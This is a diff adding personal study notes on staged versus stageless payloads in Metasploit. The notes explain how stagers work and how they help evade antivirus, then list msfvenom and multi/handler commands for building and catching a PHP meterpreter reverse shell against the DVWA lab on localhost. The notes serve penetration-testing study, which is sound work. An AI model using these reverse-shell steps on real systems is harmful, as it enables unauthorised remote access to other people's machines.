@@ -1,0 +1,74 @@
+Payload in computing is the actual information that is in transmitted data. 
+# This is in contrast to metadata.
+
+# A non-staged (STAGELESS) payload is the entire shell, or other exploit that is sent in one go.
+
+# A STAGED payload is a payload that is compact and easily transferred. 
+# Once it is uploaded the code will allow the attacker to upload a much larger file.
+
+# ADVANTAGES OF A STAGED PAYLOAD:
+#	In many post-exploitation situations there is not enough space to store large shellcode. 
+#	  Developed out of necessity --> most exploitable situations have constraints on how many 
+#	  bytes an attacker can load. 
+#	Antivirus software detect shellcode --> our actual malicious code is injected into memory
+#	  A larger payload can allow anti-virus companies to have a lot more to write signatures of
+#	  If a stager is used, there are less opportunities for the anti-virus to act, increasing the
+#	  the success rate of uploading the stage.
+  
+# DISADVANTAGES OF A STAGED PAYLOAD:
+#	Some staged payloads, such as meterpreter have large data costs and time costs to upload
+#	Downloading the stage is unobfuscated, and if you intercept with Wireshark, everything is
+#	  shown, which increases risk when deploying it in an actual attack. It is possible to
+#	  encode, and Metapsloit has given some options for that (StageEncoder).
+
+# Staged payloads are usually in two parts:
+
+#	Stage 0 (The stager): The smaller primary payload that causes the victim to connect to the 
+#		  attacker:
+#		  The payload doesn't contain everything needed to run an interactive shell
+#		  The reverse shell calls back, which then sends the second, larger payload
+#		  Using netcat to listen will not work, because the connection will terminate
+#		  This is because the second part of the payload is not sent
+
+#	Stage 1 (The stage): The larger payload that contains the rest of the shellcode, 
+#		  in Metasploit Framework it is a DLL code written in C that is compiled
+#		  and injected into memory. The simplest method of downloading the stage is through
+#		  a TCP connection, but there are other methods as well.
+
+# WHAT IS MSFVENOM?
+
+#	Msfvenom is the combination of creating shellcode and encoding.
+#	We can use Msfvenom to create our own staged and non-staged shellcodes for testing.
+
+#	Let's use DVWA to upload the two reverse shells for testing:
+
+#	STAGED PAYLOAD
+
+	msfvenom -h --> The help function
+	
+	1. msfvenom --list payloads | grep [TYPE] --> Discovers the type of payload
+	
+	2. msfvenom -p php/meterpreter/reverse_tcp LHOST:localhost LPORT:4444 -f [TYPE] -o [DESTINATION]
+
+
+	3. msfconsole --> open Metasploit
+
+	4. use exploit/multi/handler --> Handles the multiple stages of the payload, and memory injection
+
+	5. set PAYLOAD php/meterpreter/reverse_tcp, set LHOST:localhost, set LPORT:4444
+
+	6. exploit
+
+	7. Navigate onto the DVWA platform and execute the PHP reverse shell
+
+	8. Profit????
+
+#	NON-STAGED PAYLOAD
+
+	1. msfvenom -p php/meterpreter_reverse_tcp LHOST:localhost LPORT:4444 -f [TYPE] -o [DESTINATION]
+
+	2. msfconsole --> same steps as before
+
+	3. Notice how there is no stage being sent
+
+# THE END
